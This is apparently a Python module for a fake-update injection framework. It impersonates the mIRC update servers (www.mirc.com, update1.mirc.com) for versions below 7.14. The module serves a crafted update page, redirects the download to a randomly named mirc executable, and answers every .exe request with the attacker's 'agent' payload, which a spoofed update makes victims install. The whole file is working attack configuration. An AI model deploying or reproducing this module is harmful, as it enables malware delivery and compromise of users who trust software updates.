from modules import ModuleBase


class Mirc(ModuleBase):
    name = 'Mirc'
    version = '1.0'
    appver = '< 7.14'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(www.mirc.com|www.mirc.co.uk|update1.mirc.com)' 
    requests = [
        {   'path': '/update.html',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/mirc/update.html',
        },
        {   'path': '/get.html',               #regex anything
            'type': 'redirect',
            'location': 'http://www.mirc.com/mirc<%RND1%>.exe', 
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
